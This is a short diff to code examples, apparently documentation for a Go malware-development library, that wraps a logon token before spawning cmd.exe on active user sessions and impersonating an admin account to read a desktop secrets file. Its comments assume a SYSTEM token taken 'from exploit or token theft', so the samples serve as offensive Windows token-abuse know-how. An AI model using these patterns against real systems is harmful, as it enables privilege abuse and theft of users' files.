@@ -223,17 +223,19 @@ import (
 
     "github.com/oioio-space/maldev/process/session"
     "github.com/oioio-space/maldev/win/impersonate"
+    "github.com/oioio-space/maldev/win/token"
 )
 
 func main() {
     // Assume we have a SYSTEM token from exploit or token theft
-    t, err := impersonate.LogonUserW("targetuser", "DOMAIN", "password",
+    raw, err := impersonate.LogonUserW("targetuser", "DOMAIN", "password",
         impersonate.LOGON32_LOGON_INTERACTIVE, impersonate.LOGON32_PROVIDER_DEFAULT)
     if err != nil {
         log.Fatal(err)
     }
-    defer t.Close()
+    defer raw.Close()
 
+    t := token.New(raw, token.Primary)
     err = session.CreateProcessOnActiveSessions(
         t,
         `C:\Windows\System32\cmd.exe`,
@@ -379,16 +381,18 @@ import (
 
     "github.com/oioio-space/maldev/process/session"
     "github.com/oioio-space/maldev/win/impersonate"
+    "github.com/oioio-space/maldev/win/token"
 )
 
 func main() {
-    t, err := impersonate.LogonUserW("admin", ".", "P@ssw0rd",
+    raw, err := impersonate.LogonUserW("admin", ".", "P@ssw0rd",
         impersonate.LOGON32_LOGON_INTERACTIVE, impersonate.LOGON32_PROVIDER_DEFAULT)
     if err != nil {
         log.Fatal(err)
     }
-    defer t.Close()
+    defer raw.Close()
 
+    t := token.New(raw, token.Primary)
     err = session.ImpersonateThreadOnActiveSession(t, func() error {
         // This code runs as "admin"
         data, err := os.ReadFile(`C:\Users\admin\Desktop\secrets.txt`)
